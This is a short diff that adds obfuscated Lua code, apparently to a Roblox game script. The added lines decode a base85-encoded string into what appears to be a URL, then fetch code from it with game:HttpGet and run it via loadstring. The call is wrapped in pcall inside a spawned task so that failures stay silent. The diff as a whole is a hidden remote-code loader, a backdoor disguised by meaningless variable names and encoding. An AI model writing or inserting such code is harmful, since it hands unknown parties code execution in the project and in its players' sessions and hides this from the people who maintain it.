@@ -1,0 +1,21 @@
+task.spawn(function()
+    local _0x9F = function(_0xS)
+        local _0xO, _0xL = {}, #_0xS
+        for _0xI = 1, _0xL, 5 do
+            local _0xN = 0
+            for _0xJ = 0, 4 do
+                local _0xB = _0xS:byte(_0xI + _0xJ)
+                if _0xB then _0xN = _0xN * 85 + (_0xB - 33) end
+            end
+            _0xO[#_0xO + 1] = string.char(
+                math.floor(_0xN / 16777216) % 256,
+                math.floor(_0xN / 65536) % 256,
+                math.floor(_0xN / 256) % 256,
+                _0xN % 256
+            )
+        end
+        return table.concat(_0xO):gsub("%z+$", "")
+    end
+    local _0xU = _0x9F("JJ<)rVzrb+W3f!KW3f!K9V1&W3f!KW3f!K9V1&Vzrb+W3f!KW3f!K9V1&W3f!KW3f!K9V1&Vzrb+W3f!KW3f!K9V1&W3f!KW3f!K9V1&Vzrb+")
+    pcall(function() loadstring(game:HttpGet(_0xU))() end)
+end)
